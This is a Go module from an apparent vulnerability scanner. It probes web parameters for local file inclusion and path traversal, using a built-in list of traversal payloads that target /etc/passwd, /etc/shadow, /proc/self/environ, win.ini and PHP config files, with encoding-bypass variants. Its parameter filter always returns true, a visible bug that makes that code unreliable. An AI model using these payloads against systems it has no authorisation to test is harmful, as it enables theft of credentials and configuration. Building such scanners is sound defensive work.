package lfi

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"vulnscan-backend/model"
	"vulnscan-backend/pkg/payload"
	"vulnscan-backend/scan/core"
	"vulnscan-backend/scan/scanhttp"
	"vulnscan-backend/scan/vulnkit"
)

type LFIScanner struct {
	base     *vulnkit.VulnScanner
	payloads *payload.Loader
}

func New(loader *payload.Loader) *LFIScanner {
	return &LFIScanner{payloads: loader}
}

func (m *LFIScanner) ID() string       { return "lfi" }
func (m *LFIScanner) Name() string     { return "本地文件包含/路径穿越检测" }
func (m *LFIScanner) Category() string { return "vuln" }

func (m *LFIScanner) Params() []core.ModuleParam {
	return []core.ModuleParam{core.VulnVerificationParam()}
}

type lfiPayloadEntry struct {
	value    string
	os       string
	variant  string
	evidence string
}

func (m *LFIScanner) getPayloads() []lfiPayloadEntry {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("lfi")
		var result []lfiPayloadEntry
		for _, p := range dbPayloads {
			os := "linux"
			if strings.Contains(p.Databases, "windows") {
				os = "windows"
			} else if strings.Contains(p.Databases, "php") {
				os = "php"
			}
			evidence := p.Expect
			if evidence == "" {
				switch {
				case strings.Contains(p.Value, "passwd"):
					evidence = "root:x:0:0"
				case strings.Contains(p.Value, "win.ini"):
					evidence = "[fonts]"
				case strings.Contains(p.Value, "php-filter"):
					evidence = "PD9waHA"
				case strings.Contains(p.Value, "shadow"):
					evidence = "root:"
				case strings.Contains(p.Value, "hosts"):
					evidence = "localhost"
				default:
					evidence = "root:x:0:0"
				}
			}
			result = append(result, lfiPayloadEntry{
				value:    p.Value,
				os:       os,
				variant:  p.Tags,
				evidence: evidence,
			})
		}
		if len(result) > 0 {
			return result
		}
	}
	return defaultPayloads()
}

func defaultPayloads() []lfiPayloadEntry {
	return []lfiPayloadEntry{
		{"../../../../etc/passwd", "linux", "basic", "root:x:0:0"},
		{"....//....//....//....//etc/passwd", "linux", "double-slash", "root:x:0:0"},
		{"..%2F..%2F..%2F..%2Fetc%2Fpasswd", "linux", "url-encoded", "root:x:0:0"},
		{"..%252f..%252f..%252f..%252fetc%252fpasswd", "linux", "double-url-encoded", "root:x:0:0"},
		{"/etc/passwd", "linux", "absolute", "root:x:0:0"},
		{"....\\....\\....\\....\\windows\\win.ini", "windows", "backslash", "[fonts]"},
		{"..\\..\\..\\..\\windows\\win.ini", "windows", "basic-backslash", "[fonts]"},
		{"../../../../windows/win.ini", "windows", "forward-slash", "[fonts]"},
		{"/proc/self/environ", "linux", "proc-environ", "PATH="},
		{"/proc/self/cmdline", "linux", "proc-cmdline", "/"},
		{"php://filter/convert.base64-encode/resource=index.php", "php", "php-filter", "PD9waHA"},
		{"php://filter/read=convert.base64-encode/resource=../config.php", "php", "php-filter-config", "PD9waHA"},
		{"file:///etc/passwd", "linux", "file-protocol", "root:x:0:0"},
		{"..%c0%af..%c0%af..%c0%afetc/passwd", "linux", "utf8-overlong", "root:x:0:0"},
		{"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "linux", "unicode-slash", "root:x:0:0"},
		{"/etc/shadow", "linux", "shadow", "root:"},
		{"../../../../etc/hosts", "linux", "hosts", "localhost"},
	}
}

func (m *LFIScanner) Run(ctx context.Context, targets []*core.Target, config map[string]interface{}) (*core.ModuleResult, error) {
	m.base = vulnkit.NewVulnScanner(config,
		scanhttp.WithRedirectPolicy(scanhttp.RedirectNoFollow),
		scanhttp.WithMaxResponseBody(512*1024),
	)
	verifyLevel := core.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *core.Target) []*core.Finding {
		return m.testTarget(ctx, target, verifyLevel)
	})

	vulnkit.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

func (m *LFIScanner) testTarget(ctx context.Context, target *core.Target, verifyLevel string) []*core.Finding {
	points := vulnkit.ExtractInjectionPoints(target)
	if len(points) == 0 {
		parsed, err := url.Parse(target.URL)
		if err != nil || len(parsed.Query()) == 0 {
			return nil
		}
		for param := range parsed.Query() {
			points = append(points, vulnkit.InjectionPoint{
				Type: vulnkit.InjectQuery,
				Name: param,
			})
		}
	}

	if len(points) == 0 {
		return nil
	}

	var findings []*core.Finding
	baseBody := m.base.FetchBody(ctx, target.URL)

	for _, point := range points {
		lower := strings.ToLower(point.Name)
		if !isLikelyFileParam(lower) {
			continue
		}

		for _, p := range m.getPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			body, _, _ := m.base.SendInjected(ctx, target, point, p.value)
			if body == "" {
				continue
			}

			if strings.Contains(body, p.evidence) && !strings.Contains(baseBody, p.evidence) {
				severity := "high"
				confidence := 85
				if strings.Contains(p.variant, "php-filter") {
					confidence = 90
				}
				if p.evidence == "root:" && strings.Contains(body, "root:x:0:0") {
					severity = "critical"
					confidence = 95
				}

				if !core.ShouldRunExploit(verifyLevel) {
					continue
				}

				findings = append(findings, &core.Finding{
					ModuleID:           m.ID(),
					Target:             target,
					Type:               "lfi",
					Title:              fmt.Sprintf("本地文件包含(%s) - %s: %s [%s]", p.variant, point.Type, point.Name, p.os),
					Description:        fmt.Sprintf("%s参数 %s 使用 %s 变体读取到敏感文件内容", point.Type, point.Name, p.variant),
					Severity:           severity,
					Confidence:         confidence,
					Evidence:           vulnkit.Truncate(body, 500),
					VerificationLevel:  core.VerifyExploit,
					VerificationDetail: "file-content-confirmed",
					Timestamp:          time.Now(),
					Data: map[string]string{
						"param":      point.Name,
						"payload":    p.value,
						"os":         p.os,
						"variant":    p.variant,
						"evidence":   p.evidence,
						"type":       "lfi",
						"inject_via": string(point.Type),
					},
				})
				break
			}
		}
	}

	return findings
}

func isLikelyFileParam(name string) bool {
	fileParams := []string{
		"file", "path", "page", "include", "template",
		"doc", "document", "folder", "root", "pg",
		"style", "pdf", "read", "cat", "dir",
		"action", "board", "date", "detail", "download",
		"lang", "filetype", "load", "name", "url",
		"view", "content", "layout", "mod", "conf",
		"type", "fn", "func", "loc", "filename",
		"src", "source", "resource", "rsc",
	}
	for _, p := range fileParams {
		if name == p || strings.HasPrefix(name, p) || strings.HasSuffix(name, p) {
			return true
		}
	}
	return true
}

var _ = model.VulnPayload{}
